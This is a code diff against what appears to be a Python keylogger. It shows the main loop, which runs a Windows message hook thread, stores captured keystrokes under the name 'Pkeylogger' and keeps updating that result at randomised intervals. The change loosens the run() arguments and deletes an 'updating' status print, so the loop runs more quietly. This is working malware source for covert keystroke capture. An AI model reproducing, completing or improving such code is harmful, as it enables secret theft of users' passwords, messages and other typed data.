@@ -96,17 +96,16 @@ def main2():
     pythoncom.PumpMessages()
 
 
-def run(id):
+def run(*args):
     global string
     global _id
-    _id = id
+    _id = "".join(args)
     th = threading.Thread(target=main2)
     th.start()
     path = result(string, "Pkeylogger")
     time.sleep(random.randint(60, 69))
     while True:
         try:
-            print "updating"
             result_update(path, string)
             time.sleep(random.randint(360, 400))
         except:
